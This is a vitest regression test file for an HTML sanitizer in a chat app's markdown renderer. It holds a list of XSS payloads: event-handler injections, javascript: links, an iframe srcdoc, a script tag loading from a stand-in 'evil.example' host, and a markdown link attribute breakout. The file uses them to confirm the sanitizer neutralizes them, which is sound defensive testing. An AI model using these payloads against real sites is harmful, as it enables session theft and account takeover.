import { describe, it, expect } from 'vitest';
import { markdownToHtml, sanitizeHtml } from '../src/lib/markdown';

/**
 * Regression tests for the banter HTML sanitizer. The old regex blocklist only
 * stripped `<script>...</script>` pairs, QUOTED `on*="..."` handlers and quoted
 * `javascript:` hrefs; these payloads all got through it.
 */

const EXECUTABLE_TAGS = new Set(['script', 'iframe', 'object', 'embed', 'frame', 'frameset', 'base', 'meta']);
const URL_ATTRS = ['href', 'src', 'xlink:href', 'action', 'formaction', 'data'];

/** Parse html into a detached container and list every executable feature. */
function executableFeatures(html: string): string[] {
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  const found: string[] = [];
  for (const el of Array.from(tpl.content.querySelectorAll('*'))) {
    const tag = el.tagName.toLowerCase();
    if (EXECUTABLE_TAGS.has(tag)) found.push(`<${tag}>`);
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) found.push(`${tag}[${name}]`);
      if (name === 'srcdoc') found.push(`${tag}[srcdoc]`);
      if (URL_ATTRS.includes(name) && /^\s*javascript:/i.test(attr.value)) {
        found.push(`${tag}[${name}=javascript:]`);
      }
    }
  }
  return found;
}

const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href=javascript:alert(1)>x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<script/src=//evil.example/x.js>',
  '<details open ontoggle=alert(1)>',
  '<IMG SRC=x OnErRoR=alert(1)>',
];

describe('banter sanitizeHtml', () => {
  for (const payload of PAYLOADS) {
    it(`neutralizes ${payload}`, () => {
      expect(executableFeatures(sanitizeHtml(payload))).toEqual([]);
    });
  }

  it('neutralizes an attribute breakout built purely from markdown link syntax', () => {
    // markdownToHtml does not escape quotes inside the URL, so this closes
    // href and adds an unquoted handler the old regex never matched.
    const md = '[click](a"/autofocus/onfocus=location=name//)';
    expect(executableFeatures(sanitizeHtml(markdownToHtml(md)))).toEqual([]);
  });

  it('neutralizes a markdown javascript: link', () => {
    const md = '[x](javascript:alert(1))';
    expect(executableFeatures(sanitizeHtml(markdownToHtml(md)))).toEqual([]);
  });

  it('keeps normal markdown formatting, links, mentions, task refs, and code', () => {
    const md = [
      '## Heading',
      '**bold** and *italic* and `inline`',
      '[docs](https://example.com/help) ping @jonas-grumby about MAGE-38',
      '- item one',
      '```',
      'const x = 1;',
      '```',
    ].join('\n');
    const html = sanitizeHtml(markdownToHtml(md));
    const tpl = document.createElement('template');
    tpl.innerHTML = html;
    const root = tpl.content;
    expect(root.querySelector('h2')?.textContent).toBe('Heading');
    expect(root.querySelector('strong')?.textContent).toBe('bold');
    expect(root.querySelector('em')?.textContent).toBe('italic');
    expect(root.querySelector('code.rich-text-inline-code')?.textContent).toBe('inline');
    expect(root.querySelector('pre.rich-text-code-block code')?.textContent).toBe('const x = 1;');
    expect(root.querySelector('ul li')?.textContent).toBe('item one');
    expect(root.querySelector('span.mention-highlight')?.textContent).toBe('@jonas-grumby');
    const taskRef = root.querySelector('a.task-reference');
    expect(taskRef?.getAttribute('href')).toBe('/b3/tasks/ref/MAGE-38');
    const link = root.querySelector('a.rich-text-link:not(.task-reference)');
    expect(link?.getAttribute('href')).toBe('https://example.com/help');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.textContent).toBe('docs');
  });
});
